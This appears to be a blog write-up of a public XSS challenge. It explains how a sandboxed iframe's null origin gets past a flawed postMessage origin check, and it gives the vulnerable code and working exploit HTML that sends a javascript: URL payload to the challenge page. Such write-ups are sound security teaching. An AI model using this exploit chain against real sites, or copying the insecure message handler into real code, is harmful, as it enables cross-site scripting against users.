---
layout: single
title: XSS Challenge By Honoki
date: 2022-05-04
classes: wide
tags:
  - XSS
  - Challenge
  - honoki
---

How could two security features collide into a vulnerability? Read more to find out!

## Overview

The gist of the challenge is:

> I came across an interesting XSS today. Can you spot the bug and exploit it?

To start off, here is the complete codebase of the challenge.

```
<script>
var originAllowed = function(o) {
  try {
    return new URL(o,window.location.origin).hostname === new URL(window.location).hostname;
  } catch (e) {
    return false;
  }
}

window.addEventListener("message", function(e) {
  if (originAllowed(e.origin) && e.data) {
    try {
      t = JSON.parse(e.data)
    } catch (e) {}
    if (t && "object" == typeof t && t.goto) { window.location = t.goto; }
  }
});
</script>
```

The first issue here is the insecure assignment on `window.location`, which definitely leads to XSS. Here is a small PoC:

![self-xss](/assets/images/other/honoki/self-xss.png)

Unfortunately, this is only half of the challenge. As honoki explained, here's what needs to be done:

> I’m getting a lot of solutions using postMessage to generate the alert from the devtools; that’s good but only half the challenge. 😇 Try and make sure that your payload works when sent from another website/domain to solve it completely. 👏

This could only be done if the origin check at `originAllowed` is somehow insecure or broken.

The function returns true only if the event origin's hostname is equal to the location origin's hostname.

However, the first part is very suspicious.

```
new URL(o,window.location.origin)
```

Using the location origin as an URL base is a bad idea.

![twitter comment](/assets/images/other/honoki/twitter-comment.png)

If I were to somehow hide my origin, then the following would happen:

![null-origin](/assets/images/other/honoki/null-origin.png)

If an `iframe` makes a `postMessage` call and has a `sandbox` attribute that doesn’t contain the value `allow-same-origin`, [browsers give it a “unique” origin](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element:concept-origin-2):

> When the `sandbox` attribute is set, the content is treated as being from a unique origin, forms, scripts, and various potentially annoying APIs are disabled, links are prevented from targeting other browsing contexts, and plugins are secured. The allow-same-origin keyword causes the content to be treated as being from its real origin instead of forcing it into a unique origin.

When determining the value of the Origin header to send in a cross-origin request, browsers serialize any unique origin as `null` and give the Origin header that value.

## Solution

I first write the `postMessage` caller like this:

```
<html>
    <body>
        <script>
            var url = "https://demo.honoki.net/xss-challenge.html"
            var pup = window.open(url)
            setTimeout(() => {
                pup.postMessage('{"goto": "javascript:alert(document.domain)"}', url)
            },1500)
        </script>
    </body>
</html>
```

Next, I frame the code and give it the required sandbox attributes.

```
<html>
    <iframe
        src="./exploit.html"
        sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox"
    ></iframe>
</html>
```

The `allow-scripts`, `allow-popups` and `allow-popups-to-escape-sandbox` are required to make the `postMessage` call.

Here is the result when I run it on a local server.

![alert](/assets/images/other/honoki/alert.png)

Thanks for reading!